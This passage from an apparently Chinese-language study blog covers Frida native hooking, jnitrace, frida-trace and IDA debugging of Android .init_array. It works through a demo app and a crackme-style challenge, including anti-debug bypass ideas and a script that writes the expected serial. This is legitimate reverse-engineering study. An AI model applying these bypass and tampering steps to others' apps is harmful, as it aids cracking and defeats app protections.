libnative_lib_addr);</span><br><span class="line">        <span class="keyword">var</span> addr_775C = libnative_lib_addr.add(<span class="number">0x775C</span>);</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"addr_775C:"</span>, addr_775C);</span><br><span class="line"></span><br><span class="line">        Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            Interceptor.attach(addr_775C, &#123;</span><br><span class="line">                onEnter: <span class="function"><span class="keyword">function</span> (<span class="params">args</span>) </span>&#123;</span><br><span class="line">                    <span class="keyword">var</span> name = <span class="keyword">this</span>.context.x0.readCString()</span><br><span class="line">                    <span class="built_in">console</span>.log(<span class="string">"addr_775C OnEnter :"</span>, <span class="keyword">this</span>.returnAddress, name);</span><br><span class="line">                &#125;,</span><br><span class="line">                onLeave: <span class="function"><span class="keyword">function</span> (<span class="params">retval</span>) </span>&#123;</span><br><span class="line">                     <span class="built_in">console</span>.log(<span class="string">"retval is :"</span>, retval) </span><br><span class="line">                &#125;</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">setImmediate(inline_hook())</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Attaching...                                                            </span><br><span class="line">libnative_lib_addr: 0x79fabe0000</span><br><span class="line">addr_775C: 0x79fabe775c</span><br><span class="line">TypeError: cannot read property &#39;apply&#39; of undefined</span><br><span class="line">    at [anon] (..&#x2F;..&#x2F;..&#x2F;frida-gum&#x2F;bindings&#x2F;gumjs&#x2F;duktape.c:56618)</span><br><span class="line">    at frida&#x2F;runtime&#x2F;core.js:55</span><br><span class="line">[Google Pixel::myapplication.example.com.ndk_demo]-&gt; addr_775C OnEnter : 0x79fabe7758 sakura</span><br><span class="line">addr_775C OnEnter : 0x79fabe7758 sakura</span><br></pre></td></tr></table></figure><p>到这里已经可以总结一下我目前的学习了，需要补充一些frida api的学习，比如NativePointr里居然有个readCString，这些API是需要再看看的。</p><h2 id="Frida-native-hook-Frida-hook-native-app实战"><a href="#Frida-native-hook-Frida-hook-native-app实战" class="headerlink" title="Frida native hook : Frida hook native app实战"></a>Frida native hook : Frida hook native app实战</h2><ul><li>破解Frida全端口检测的native层反调试<ul><li>hook libc的pthread_create函数</li></ul></li><li>破解TracePid的native反调试<ul><li>target: <a href="https://gtoad.github.io/2017/06/25/Android-Anti-Debug/" target="_blank" rel="noopener">https://gtoad.github.io/2017/06/25/Android-Anti-Debug/</a></li><li>solve : hook libc的fgets函数</li></ul></li><li>native层修改参数、返回值</li><li>静态分析<code>JNI_Onload</code></li><li>动态trace主动注册 &amp; IDA溯源</li><li>动态trace JNI、libc函数 &amp; IDA溯源</li><li>native层主动调用、打调用栈</li><li>主动调用libc读写文件</li></ul><p>看下logcat</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">n&#x2F;u0a128 for activity com.gdufs.xman&#x2F;.MainActivity</span><br><span class="line">12-28 05:53:26.898 26615 26615 V com.gdufs.xman: JNI_OnLoad()</span><br><span class="line">12-28 05:53:26.898 26615 26615 V com.gdufs.xman: RegisterNatives() --&gt; nativeMethod() ok</span><br><span class="line">12-28 05:53:26.898 26615 26615 D com.gdufs.xman m&#x3D;: 0</span><br><span class="line">12-28 05:53:26.980 26615 26615 D com.gdufs.xman m&#x3D;: Xman</span><br></pre></td></tr></table></figure><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-07-02-101517.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-07-02-101821.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-07-02-101843.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sakura@sakuradeMacBook-Pro:~&#x2F;gitsource&#x2F;frida-agent-example&#x2F;agent$ frida -U --no-pause -f com.gdufs.xman -l hook_reg.js</span><br><span class="line">...</span><br><span class="line">[Google Pixel::com.gdufs.xman]-&gt; [RegisterNatives] method_count: 0x3</span><br><span class="line">[RegisterNatives] java_class: com.gdufs.xman.MyApp name: initSN sig: ()V fnPtr: 0xd4ddf3b1 module_name: libmyjni.so module_base: 0xd4dde000 offset: 0x13b1</span><br><span class="line">[RegisterNatives] java_class: com.gdufs.xman.MyApp name: saveSN sig: (Ljava&#x2F;lang&#x2F;String;)V fnPtr: 0xd4ddf1f9 module_name: libmyjni.so module_base: 0xd4dde000 offset: 0x11f9</span><br><span class="line">[RegisterNatives] java_class: com.gdufs.xman.MyApp name: work sig: ()V fnPtr: 0xd4ddf4cd module_name: libmyjni.so module_base: 0xd4dde000 offset: 0x14cd</span><br></pre></td></tr></table></figure><ul><li>initSN<br>感觉意思应该是从<code>/sdcard/reg.dat</code>里读一个值，然后和<code>EoPAoY62@ElRD</code>进行比较。<br>最后setValue，从导出函数看一下，最后推测第一个参数应该是JNIEnv *env，然后就看到了给字段m赋值。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-07-02-121051.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-07-02-102944.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-07-02-102844.png" alt=""></li><li>saveSN<br>这个看上去就是根据str的值，去变换”W3_arE_whO_we_ARE”字符串，然后写入到<code>/sdcard/reg.dat</code>里<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-07-02-112221.png" alt=""></li></ul><p>结合一下看，只要initSN检查到<code>/sdcard/reg.dat</code>里是<code>EoPAoY62@ElRD</code>，应该就会给m设置成1。<br>只要m的值是1，就能走到work()函数的逻辑。</p><p>参考<a href="https://frida.re/docs/javascript-api/#file" target="_blank" rel="noopener">frida的file api</a></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> file = <span class="keyword">new</span> File(<span class="string">"/sdcard/reg.dat"</span>,<span class="string">'w'</span>)</span><br><span class="line">    file.write(<span class="string">"EoPAoY62@ElRD"</span>)</span><br><span class="line">    file.flush()</span><br><span class="line">    file.close()</span><br><span class="line">&#125;</span><br><span class="line">setImmediate(main())</span><br></pre></td></tr></table></figure><p>这样我们继续看work的逻辑<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-07-02-120940.png" alt=""></p><p>v2是从getValue得到的，看上去就是m字段的值，此时应该是1，一会hook一下看看。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-07-02-121012.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[NewStringUTF] bytes:输入即是flag,格式为xman&#123;……&#125;！</span><br></pre></td></tr></table></figure><p>callWork里又调用了work函数，死循环了。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-07-02-120907.png" alt=""></p><p>那看来看去最后还是回到了initSN，那其实我们看的顺序似乎错了。<br>理一下逻辑，n2执行完保存到文件，然后n1 check一下，所以最后还是要逆n2的算法，pass。</p><h2 id="Frida-trace四件套"><a href="#Frida-trace四件套" class="headerlink" title="Frida trace四件套"></a>Frida trace四件套</h2><h3 id="jni-trace-trace-jni"><a href="#jni-trace-trace-jni" class="headerlink" title="jni trace : trace jni"></a>jni trace : trace jni</h3><p><a href="https://github.com/chame1eon/jnitrace" target="_blank" rel="noopener">https://github.com/chame1eon/jnitrace</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pip install jnitrace</span><br><span class="line"></span><br><span class="line">Requirement already satisfied: frida&gt;&#x3D;12.5.0 in &#x2F;Users&#x2F;sakura&#x2F;.pyenv&#x2F;versions&#x2F;3.7.7&#x2F;lib&#x2F;python3.7&#x2F;site-packages (from jnitrace) (12.8.0)</span><br><span class="line">Requirement already satisfied: colorama in &#x2F;Users&#x2F;sakura&#x2F;.pyenv&#x2F;versions&#x2F;3.7.7&#x2F;lib&#x2F;python3.7&#x2F;site-packages (from jnitrace) (0.4.3)</span><br><span class="line">Collecting hexdump (from jnitrace)</span><br><span class="line">  Downloading https:&#x2F;&#x2F;files.pythonhosted.org&#x2F;packages&#x2F;55&#x2F;b3&#x2F;279b1d57fa3681725d0db8820405cdcb4e62a9239c205e4ceac4391c78e4&#x2F;hexdump-3.3.zip</span><br><span class="line">Installing collected packages: hexdump, jnitrace</span><br><span class="line">  Running setup.py install for hexdump ... done</span><br><span class="line">  Running setup.py install for jnitrace ... done</span><br><span class="line">Successfully installed hexdump-3.3 jnitrace-3.0.8</span><br></pre></td></tr></table></figure><p>usage: <code>jnitrace [options] -l libname target</code><br>默认应该是spawn运行的，</p><ul><li><code>-m</code>来指定是<code>spawn</code>还是<code>attach</code></li><li><code>-b</code>指定是<code>fuzzy</code>还是<code>accurate</code></li><li><code>-i &lt;regex&gt;</code>指定一个正则表达式来过滤出方法名，例如<code>-i Get -i RegisterNatives</code>就会只打印出名字里包含Get或者RegisterNatives的JNI methods。</li><li><code>-e &lt;regex&gt;</code>和<code>-i</code>相反，同样通过正则表达式来过滤，但这次会将指定的内容忽略掉。</li><li><code>-I &lt;string&gt;</code>trace导出的方法，jnitrace认为导出的函数应该是从Java端能够直接调用的函数，所以可以包括使用RegisterNatives来注册的函数，例如<code>-I stringFromJNI -I nativeMethod([B)V</code>，就包括导出名里有stringFromJNI，以及使用RegisterNames来注册，并带有nativeMethod([B)V签名的函数。</li><li><code>-o path/output.json</code>，导出输出到文件里。</li><li><code>-p path/to/script.js</code>，用于在加载jnitrace脚本之前将指定路径的Frida脚本加载到目标进程中，这可以用于在jnitrace启动之前对抗反调试。</li><li><code>-a path/to/script.js</code>，用于在加载jnitrace脚本之后将指定路径的Frida脚本加载到目标进程中</li><li><code>--ignore-env</code>，不打印所有的JNIEnv函数</li><li><code>--ignore-vm</code>，不打印所有的JavaVM函数<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">sakura@sakuradeMacBook-Pro:~&#x2F;Desktop&#x2F;lab&#x2F;alpha&#x2F;tools&#x2F;android&#x2F;frida_learn&#x2F;0620&#x2F;0620&#x2F;xman&#x2F;resources&#x2F;lib&#x2F;armeabi-v7a$ jnitrace -l libmyjni.so com.gdufs.xman</span><br><span class="line">Tracing. Press any key to quit...</span><br><span class="line">Traced library &quot;libmyjni.so&quot; loaded from path &quot;&#x2F;data&#x2F;app&#x2F;com.gdufs.xman-X0HkzLhbptSc0tjGZ3yQ2g&#x3D;&#x3D;&#x2F;lib&#x2F;arm&quot;.</span><br><span class="line"></span><br><span class="line">           &#x2F;* TID 28890 *&#x2F;</span><br><span class="line">    355 ms [+] JavaVM-&gt;GetEnv</span><br><span class="line">    355 ms |- JavaVM*          : 0xefe99140</span><br><span class="line">    355 ms |- void**           : 0xda13e028</span><br><span class="line">    355 ms |:     0xeff312a0</span><br><span class="line">    355 ms |- jint             : 65542</span><br><span class="line">    355 ms |&#x3D; jint             : 0</span><br><span class="line"></span><br><span class="line">    355 ms ------------------------Backtrace------------------------</span><br><span class="line">    355 ms |-&gt; 0xda13a51b: JNI_OnLoad+0x12 (libmyjni.so:0xda139000)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">           &#x2F;* TID 28890 *&#x2F;</span><br><span class="line">    529 ms [+] JNIEnv-&gt;FindClass</span><br><span class="line">    529 ms |- JNIEnv*          : 0xeff312a0</span><br><span class="line">    529 ms |- char*            : 0xda13bdef</span><br><span class="line">    529 ms |:     com&#x2F;gdufs&#x2F;xman&#x2F;MyApp</span><br><span class="line">    529 ms |&#x3D; jclass           : 0x81    &#123; com&#x2F;gdufs&#x2F;xman&#x2F;MyApp &#125;</span><br><span class="line"></span><br><span class="line">    529 ms ------------------------Backtrace------------------------</span><br><span class="line">    529 ms |-&gt; 0xda13a539: JNI_OnLoad+0x30 (libmyjni.so:0xda139000)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">           &#x2F;* TID 28890 *&#x2F;</span><br><span class="line">    584 ms [+] JNIEnv-&gt;RegisterNatives</span><br><span class="line">    584 ms |- JNIEnv*          : 0xeff312a0</span><br><span class="line">    584 ms |- jclass           : 0x81    &#123; com&#x2F;gdufs&#x2F;xman&#x2F;MyApp &#125;</span><br><span class="line">    584 ms |- JNINativeMethod* : 0xda13e004</span><br><span class="line">    584 ms |:     0xda13a3b1 - initSN()V</span><br><span class="line">    584 ms |:     0xda13a1f9 - saveSN(Ljava&#x2F;lang&#x2F;String;)V</span><br><span class="line">    584 ms |:     0xda13a4cd - work()V</span><br><span class="line">    584 ms |- jint             : 3</span><br><span class="line">    584 ms |&#x3D; jint             : 0</span><br><span class="line"></span><br><span class="line">    584 ms ------------------------Backtrace------------------------</span><br><span class="line">    584 ms |-&gt; 0xda13a553: JNI_OnLoad+0x4a (libmyjni.so:0xda139000)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">           &#x2F;* TID 28890 *&#x2F;</span><br><span class="line">    638 ms [+] JNIEnv-&gt;FindClass</span><br><span class="line">    638 ms |- JNIEnv*          : 0xeff312a0</span><br><span class="line">    638 ms |- char*            : 0xda13bdef</span><br><span class="line">    638 ms |:     com&#x2F;gdufs&#x2F;xman&#x2F;MyApp</span><br><span class="line">    638 ms |&#x3D; jclass           : 0x71    &#123; com&#x2F;gdufs&#x2F;xman&#x2F;MyApp &#125;</span><br><span class="line"></span><br><span class="line">    638 ms -----------------------Backtrace-----------------------</span><br><span class="line">    638 ms |-&gt; 0xda13a377: setValue+0x12 (libmyjni.so:0xda139000)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">           &#x2F;* TID 28890 *&#x2F;</span><br><span class="line">    688 ms [+] JNIEnv-&gt;GetStaticFieldID</span><br><span class="line">    688 ms |- JNIEnv*          : 0xeff312a0</span><br><span class="line">    688 ms |- jclass           : 0x71    &#123; com&#x2F;gdufs&#x2F;xman&#x2F;MyApp &#125;</span><br><span class="line">    688 ms |- char*            : 0xda13be04</span><br><span class="line">    688 ms |:     m</span><br><span class="line">    688 ms |- char*            : 0xda13be06</span><br><span class="line">    688 ms |:     I</span><br><span class="line">    688 ms |&#x3D; jfieldID         : 0xf1165004    &#123; m:I &#125;</span><br><span class="line"></span><br><span class="line">    688 ms -----------------------Backtrace-----------------------</span><br><span class="line">    688 ms |-&gt; 0xda13a38d: setValue+0x28 (libmyjni.so:0xda139000)</span><br></pre></td></tr></table></figure></li></ul><h3 id="strace-trace-syscall"><a href="#strace-trace-syscall" class="headerlink" title="strace : trace syscall"></a>strace : trace syscall</h3><p><a href="https://linuxtools-rst.readthedocs.io/zh_CN/latest/tool/strace.html" target="_blank" rel="noopener">https://linuxtools-rst.readthedocs.io/zh_CN/latest/tool/strace.html</a></p><h3 id="frida-trace-trace-libc-or-more"><a href="#frida-trace-trace-libc-or-more" class="headerlink" title="frida-trace : trace libc(or more)"></a>frida-trace : trace libc(or more)</h3><p><a href="https://frida.re/docs/frida-trace/" target="_blank" rel="noopener">https://frida.re/docs/frida-trace/</a></p><p>Usage:<code>frida-trace [options] target</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">frida-trace -U -i &quot;strcmp&quot; -f com.gdufs.xman</span><br><span class="line">...</span><br><span class="line">  5634 ms  strcmp(s1&#x3D;&quot;fi&quot;, s2&#x3D;&quot;es-US&quot;)</span><br><span class="line">  5635 ms  strcmp(s1&#x3D;&quot;da&quot;, s2&#x3D;&quot;es-US&quot;)</span><br><span class="line">  5635 ms  strcmp(s1&#x3D;&quot;es&quot;, s2&#x3D;&quot;es-US&quot;)</span><br><span class="line">  5635 ms  strcmp(s1&#x3D;&quot;eu-ES&quot;, s2&#x3D;&quot;es-US&quot;)</span><br><span class="line">  5635 ms  strcmp(s1&#x3D;&quot;et-EE&quot;, s2&#x3D;&quot;es-US&quot;)</span><br><span class="line">  5635 ms  strcmp(s1&#x3D;&quot;et-EE&quot;, s2&#x3D;&quot;es-US&quot;)</span><br></pre></td></tr></table></figure><ul><li>art trace: <a href="https://github.com/lasting-yang/frida_hook_libart/blob/master/hook_artmethod.js" target="_blank" rel="noopener">hook artmethod</a></li></ul><h3 id="hook-artmethod-trace-java函数调用"><a href="#hook-artmethod-trace-java函数调用" class="headerlink" title="hook_artmethod : trace java函数调用"></a>hook_artmethod : trace java函数调用</h3><p><a href="https://github.com/lasting-yang/frida_hook_libart/blob/master/hook_artmethod.js" target="_blank" rel="noopener">https://github.com/lasting-yang/frida_hook_libart/blob/master/hook_artmethod.js</a></p><h3 id="修改AOSP源码打印"><a href="#修改AOSP源码打印" class="headerlink" title="修改AOSP源码打印"></a>修改AOSP源码打印</h3><p><a href="https://bbs.pediy.com/thread-255653-1.htm" target="_blank" rel="noopener">改aosp源码trace信息</a></p><h2 id="Frida-native-hook-init-array开发和自动化逆向"><a href="#Frida-native-hook-init-array开发和自动化逆向" class="headerlink" title="Frida native hook : init_array开发和自动化逆向"></a>Frida native hook : init_array开发和自动化逆向</h2><h3 id="init-array原理"><a href="#init-array原理" class="headerlink" title="init_array原理"></a>init_array原理</h3><p>常见的保护都会在init_array里面做，关于其原理，主要阅读以下文章即可。</p><ul><li><a href="https://www.cnblogs.com/bingghost/p/6297325.html" target="_blank" rel="noopener">IDA调试android so的.init_array数组</a></li><li><a href="https://www.dllhook.com/post/213.html" target="_blank" rel="noopener">Android NDK中.init段和.init_array段函数的定义方式</a></li><li><a href="https://wooyun.js.org/drops/Android%20Linker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html" target="_blank" rel="noopener">Linker学习笔记</a></li></ul><h3 id="IDA静态分析init-array"><a href="#IDA静态分析init-array" class="headerlink" title="IDA静态分析init_array"></a>IDA静态分析init_array</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 编译生成后在.init段 [名字不可更改]</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">"C"</span> <span class="keyword">void</span> _init(<span class="keyword">void</span>) &#123;</span><br><span class="line">    LOGD(<span class="string">"Enter init......"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 编译生成后在.init_array段 [名字可以更改]</span></span><br><span class="line">__attribute__((__constructor__)) <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">sakura_init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    LOGD(<span class="string">"Enter sakura_init......"</span>);</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"><span class="number">2016</span><span class="number">-12</span><span class="number">-29</span> <span class="number">16</span>:<span class="number">51</span>:<span class="number">23.017</span> <span class="number">5160</span><span class="number">-5160</span>/com.example.ndk_demo D/sakura1328: Enter init......</span><br><span class="line"><span class="number">2016</span><span class="number">-12</span><span class="number">-29</span> <span class="number">16</span>:<span class="number">51</span>:<span class="number">23.017</span> <span class="number">5160</span><span class="number">-5160</span>/com.example.ndk_demo D/sakura1328: Enter sakura_init......</span><br></pre></td></tr></table></figure><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-07-02-161438.png" alt=""><br>IDA快捷键<code>shift+F7</code>找到segment，然后就可以找到<code>.init_array</code>段，然后就可以找到里面保存的函数地址。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-07-02-161519.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-07-02-161601.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-07-02-161613.png" alt=""></p><h3 id="IDA动态调试so"><a href="#IDA动态调试so" class="headerlink" title="IDA动态调试so"></a>IDA动态调试so</h3><ul><li><p>打开要调试的apk，找到入口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sakura@sakuradeMacBook-Pro:~&#x2F;.gradle&#x2F;caches$ adb shell dumpsys activity top | grep TASK</span><br><span class="line">TASK com.android.systemui id&#x3D;29 userId&#x3D;0</span><br><span class="line">TASK null id&#x3D;26 userId&#x3D;0</span><br><span class="line">TASK com.example.ndk_demo id&#x3D;161 userId&#x3D;0</span><br></pre></td></tr></table></figure></li><li><p>启动apk,并让设备将处于一个Waiting For Debugger的状态<br><code>adb shell am start -D -n com.example.ndk_demo/.MainActivity</code></p></li><li><p>执行android_server64</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sailfish:&#x2F;data&#x2F;local&#x2F;tmp # .&#x2F;android_server64</span><br><span class="line">IDA Android 64-bit remote debug server(ST) v1.22. Hex-Rays (c) 2004-2017</span><br><span class="line">Listening on 0.0.0.0:23946...</span><br></pre></td></tr></table></figure></li><li><p>新开一个窗口使用forward程序进行端口转发：<code>adb forward tcp:23946 tcp:23946</code></p></li></ul><p><code>adb  forward  tcp:&lt;本地机器的网络端口号&gt;  tcp:&lt;模拟器或是真机的网络端口号&gt;</code><br>例:adb [-d|-e|-s <serialNumber>] forward tcp:6100 tcp:7100 表示把本机的6100端口号与模拟器的7100端口建立起相关，当模拟器或真机向自己的7100端口发送了数据，那们我们可以在本机的6100端口读取其发送的内容，这是一个很关键的命令，以后我们使用jdb调试apk之前，就要用它先把目标进程和本地端口建立起关联</p><ul><li><p>打开IDA，选择菜单Debugger -&gt; Attach -&gt; Remote ARM Linux/Android debugger</p></li><li><p>打开IDA，选择菜单Debugger -&gt; Process options, 填好，然后选择进程去attach。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-07-03-082029.png" alt=""></p></li><li><p>查看待调试的进程<code>adb jdwp</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sakura@sakuradeMacBook-Pro:~$ adb jdwp</span><br><span class="line">10436</span><br></pre></td></tr></table></figure></li><li><p>转发端口<code>adb forward tcp:8700 jdwp:10436</code>，将该进程的调试端口和本机的8700绑定。</p></li><li><p>jdb连接调试端口，从而让程序继续运行 <code>jdb -connect com.sun.jdi.SocketAttach:hostname=127.0.0.1,port=8700</code></p></li><li><p>找到断点并断下。</p></li></ul><p>打开module<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-07-03-095937.png" alt=""><br>找到linker64<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-07-03-095955.png" alt=""><br>找到call array函数<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-07-03-100022.png" alt=""><br>下断并按F9断下<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-07-03-100042.png" alt=""></p><p>最终我确实可以调试到<code>.init_array</code>的初始化，具体的代码分析见<a href="https://wooyun.js.org/drops/Android%20Linker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html" target="_blank" rel="noopener">Linker学习笔记</a>这里。</p><h3 id="init-array-amp-amp-JNI-Onload-“自吐”"><a href="#init-array-amp-amp-JNI-Onload-“自吐”" class="headerlink" title="init_array &amp;&amp; JNI_Onload “自吐”"></a>init_array &amp;&amp; JNI_Onload “自吐”</h3><h4 id="JNI-Onload"><a href="#JNI-Onload" class="headerlink" title="JNI_Onload"></a>JNI_Onload</h4><p>目标是找到动态注册的函数的地址，因为这种函数没有导出。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">JNINativeMethod methods[] = &#123;</span><br><span class="line">            &#123;<span class="string">"stringFromJNI2"</span>, <span class="string">"()Ljava/lang/String;"</span>, (<span class="keyword">void</span> *) stringFromJNI2&#125;,</span><br><span class="line">    &#125;;</span><br><span class="line">    env-&gt;RegisterNatives(env-&gt;FindClass(<span class="string">"com/example/ndk_demo/MainActivity"</span>), methods,</span><br><span class="line">                         <span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>首先<code>jnitrace -m spawn -i &quot;RegisterNatives&quot; -l libnative-lib.so com.example.ndk_demo</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">525 ms [+] JNIEnv-&gt;RegisterNatives</span><br><span class="line">525 ms |- JNIEnv*          : 0x7a106cc1c0</span><br><span class="line">525 ms |- jclass           : 0x89    &#123; com&#x2F;example&#x2F;ndk_demo&#x2F;MainActivity &#125;</span><br><span class="line">525 ms |- JNINativeMethod* : 0x7ff0b71120</span><br><span class="line">525 ms |:     0x79f00d36b0 - stringFromJNI2()Ljava&#x2F;lang&#x2F;String;</span><br></pre></td></tr></table></figure><p>然后<code>objection -d -g com.example.ndk_demo run memory list modules explore | grep demo</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sakura@sakuradeMacBook-Pro:~$ objection -d -g com.example.ndk_demo run memory list modules explore | grep demo</span><br><span class="line">[debug] Attempting to attach to process: &#96;com.example.ndk_demo&#96;</span><br><span class="line">Warning: Output is not to a terminal (fd&#x3D;1).</span><br><span class="line">base.odex                                        0x79f0249000  106496 (104.0 KiB)    &#x2F;data&#x2F;app&#x2F;com.example.ndk_demo-HGAFhnKyKCSIpzn227pwXw&#x3D;&#x3D;&#x2F;oat&#x2F;arm64&#x2F;base.odex</span><br><span class="line">libnative-lib.so                                 0x79f00c4000  221184 (216.0 KiB)    &#x2F;data&#x2F;app&#x2F;com.example.ndk_demo-HGAFhnKyKCSIpzn227pwXw&#x3D;&#x3D;&#x2F;lib&#x2F;arm64&#x2F;libnative...</span><br></pre></td></tr></table></figure><p>offset = 0x79f00d36b0 - 0x79f00c4000 = 0xf6b0</p><p>这样就找到了<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-07-03-122151.png" alt=""></p><h4 id="init-array"><a href="#init-array" class="headerlink" title="init_array"></a>init_array</h4><p>没有支持arm64，可以在安装app的时候<code>adb install --abi armeabi-v7a</code>强制让app运行在32位模式</p><p>这个脚本整体来说就是hook callfunction，然后打印出init_array里面的函数地址和参数等。</p><p>从源码看，关键就是call_array这里调用的call_function，第一个参数代表这是注册的init_array里面的function，第二个参数则是init_array里存储的函数的地址。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 